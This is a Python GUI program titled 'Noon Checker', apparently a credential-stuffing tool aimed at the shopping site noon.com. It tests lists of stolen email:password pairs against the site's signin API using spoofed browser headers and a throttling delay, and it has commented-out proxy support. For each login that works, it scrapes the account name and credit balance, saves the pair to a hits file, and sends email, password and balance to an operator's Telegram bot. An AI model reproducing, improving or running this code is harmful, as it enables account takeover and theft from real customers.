import requests
import json
import tkinter as tk
from tkinter import filedialog, PhotoImage, messagebox
from bs4 import BeautifulSoup
import telegram
import time
import threading

def read_config():
    try:
        with open("config.txt", "r") as config_file:
            for line in config_file:
                if line.startswith("BOT_TOKEN="):
                    bot_token = line.strip("BOT_TOKEN=").strip()
                elif line.startswith("CHAT_ID="):
                    chat_id = line.strip("CHAT_ID=").strip()
        return bot_token, chat_id
    except FileNotFoundError:
        messagebox.showerror("Error", "config.txt not found!")
        return None, None

def browse_accounts():
    global accounts
    accounts = filedialog.askopenfilename(title="Select Accounts File", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    accounts_label.config(text=accounts)

def browse_proxy():
    global proxy_file
    proxy_file = filedialog.askopenfilename(title="Select Proxy File", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    proxy_label.config(text=proxy_file)

#def toggle_proxy():
#    global proxy_enabled
#    proxy_enabled = not proxy_enabled
#    if proxy_enabled:
#        proxy_button.config(text="Proxy: On", bg="green")
#    else:
#        proxy_button.config(text="Proxy: Off", bg="red")

def start_check():
    global accounts
    bot_token, chat_id = read_config()

    if not bot_token or not chat_id:
        messagebox.showerror("Error", "Please sign in to your bot first!")
        return

#    proxies = None

#   if proxy_enabled:
#        if proxy_file:
#            try:
#                with open(proxy_file, "r") as proxy_file:
#                    proxy = proxy_file.read().strip()
#                    proxies = {
#                        "http": proxy,
#                        "https": proxy
#                    }
#            except FileNotFoundError:
#                messagebox.showerror("Error", "Proxy file not found!")
#                return
#        else:
#            messagebox.showerror("Error", "Please select a proxy file!")
#            return

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    headers = {
        "Sec-Ch-Ua": 'Chromium;v="117", "Not;A=Brand";v="8"',
        "X-Locale": "en-ae",
        "X-Content": "desktop",
        "X-Mp": "noon",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Platform": "web",
        "User-Agent": user_agent,
        "X-Cms": "v2",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Cache-Control": "no-cache, max-age=0, must-revalidate, no-store",
        "X-Visitor-Id": "e4cbed99-48db-46da-a403-1c07b545ebdf",
        "Sec-Ch-Ua-Platform": 'Windows',
        "Origin": "https://www.noon.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.noon.com/uae-en/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }

    accounts_list = []
    if accounts:
        try:
            with open(accounts, "r") as accounts_file:
                accounts_list = accounts_file.read().splitlines()
        except FileNotFoundError:
            messagebox.showerror("Error", "Accounts file not found!")
            return
    else:
        messagebox.showerror("Error", "Please select an accounts file!")
        return

    balances = {}
    successful_accounts = []

    hits_count = 0
    bad_accounts_count = 0

    # إضافة متغير للتحكم في مدة التأخير بين الفحص والآخر (بالثواني)
    delay_between_checks = 5

    with open("hitnoon.com", "w") as hit_file:
        for account in accounts_list:
            account = account.strip()
            email, password = account.split(":")
            if {"email": email, "password": password} in successful_accounts:
                continue

            data = {
                "email": email,
                "password": password
            }

            url = "https://api-app.noon.com/_svc/customer-v1/auth/signin"

            session = requests.Session()
            response = session.post(url, json=data, headers=headers,)

            if response.status_code == 200:
                hits_count += 1
                hits_label.config(text=f"Hits: {hits_count}")
                app.update()  # تحديث واجهة المستخدم

                home_url = "https://www.noon.com/uae-en/"
                response_home = session.get(home_url, headers=headers)
                home_soup = BeautifulSoup(response_home.content, "html.parser")
                user_text_element = home_soup.find("span", {"class": "userText"})
                if user_text_element:
                    user_name_element = user_text_element.find("span", {"class": "userName", "data-qa": "dd_userName"})
                    if user_name_element:
                        user_name = user_name_element.get_text(strip=True)
                    else:
                        user_name = "Not found"
                else:
                    user_name = "Not found"

                url_credit = "https://api-app.noon.com/_svc/customer-v1/credit"
                response_credit = session.get(url_credit, headers=headers)
                credit_data = response_credit.json()
                currency_code = credit_data["data"]["currencyCode"]
                balance = credit_data["data"]["balance"]
                balances[f"{email}"] = {"balance": balance, "currencyCode": currency_code, "name": user_name}
                bot = telegram.Bot(token=bot_token)
                bot.send_message(chat_id=chat_id, text=f"""
                ▁▁▁▁▁▁𝑻𝑶𝑶𝑳 𝑩𝒀 @LAZ_DEV▁▁▁▁▁▁
                ────────────────────────
                 𝑬𝑴𝑨𝑰𝑳 ⁝ {email},📧
                ────────────────────────
                 𝑩𝑨𝑳𝑨𝑵𝑪𝑬 ⁝ {balance}💸 
                ────────────────────────
                 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 ⁝ {password} 🔓
                ────────────────────────
                """)
                successful_accounts.append({"email": email, "password": password})
                # كتابة الحسابات الجيدة في الملف
                hit_file.write(f"{email}:{password}\n")
            else:
                bad_accounts_count += 1
                bad_acc_label.config(text=f"Bad Acc: {bad_accounts_count}")
                app.update()  # تحديث واجهة المستخدم

            # تأخير قبل الفحص التالي
            time.sleep(delay_between_checks)

    messagebox.showinfo("Info", "Done checking all accounts!")

# ... الجزء الباقي من السكريبت هو نفسه


def open_login_window():
    login_window = tk.Toplevel(app)
    login_window.title("Sign In")
    login_window.geometry("300x150")

    token_label = tk.Label(login_window, text="Bot Token:🤖")
    token_label.pack(pady=5)
    token_entry = tk.Entry(login_window)
    token_entry.pack(pady=5)

    chat_id_label = tk.Label(login_window, text="Chat ID:")
    chat_id_label.pack(pady=5)
    chat_id_entry = tk.Entry(login_window)
    chat_id_entry.pack(pady=5)

    login_button = tk.Button(login_window, text="Sign In", command=lambda: save_telegram_config(token_entry.get(), chat_id_entry.get()))
    login_button.pack(pady=5)

def save_telegram_config(bot_token, chat_id):
    if bot_token and chat_id:
        with open("config.txt", "w") as config_file:
            config_file.write(f"BOT_TOKEN={bot_token}\n")
            config_file.write(f"CHAT_ID={chat_id}\n")
        messagebox.showinfo("Info", "Telegram config saved successfully!")
    else:
        messagebox.showerror("Error", "Please enter both Bot Token and Chat ID!")

app = tk.Tk()
app.title("Noon Checker v1.0 by @lfillaz")
app.geometry("400x580")
app.configure(bg="black")

proxy_file = None
proxy_enabled = True
accounts = None

proxy_label = tk.Label(app, text="https://t.me/laz_dev", bg="black", fg="white")
proxy_label.pack()

#proxy_button = tk.Button(app, text="Proxy: On", command=toggle_proxy, bg="green", fg="black")
#proxy_button.pack(pady=5)

#proxy_file_button = tk.Button(app, text="Select Proxy File", command=browse_proxy, bg="blue", fg="black")
#proxy_file_button.pack(pady=5)

accounts_button = tk.Button(app, text="Select Accounts File", command=browse_accounts, bg="blue", fg="black")
accounts_button.pack(pady=5)
accounts_label = tk.Label(app, text="", bg="black", fg="white")
accounts_label.pack()

# إزالة مربع النتائج واستخدام scrolledtext بدلاً منه
#results_text = tk.scrolledtext.ScrolledText(app, state=tk.DISABLED, bg="black", fg="white")
#results_text.pack(fill=tk.BOTH, expand=True)

# إضافة الصورة وسط التطبيق
image = PhotoImage(file="Noon_(company).png")
image_label = tk.Label(app, image=image, bg="black")
image_label.pack()

hits_label = tk.Label(app, text="Hits: 0", bg="black", fg="green")
hits_label.pack()

bad_acc_label = tk.Label(app, text="Bad Acc: 0", bg="black", fg="red")
bad_acc_label.pack()

start_button = tk.Button(app, text="Start Check", command=start_check, bg="green", fg="black")
start_button.pack(pady=10)

login_button = tk.Button(app, text="Sign In to Bot", command=open_login_window, bg="blue", fg="black")
login_button.place(x=10, y=10)

read_config()
app.mainloop()
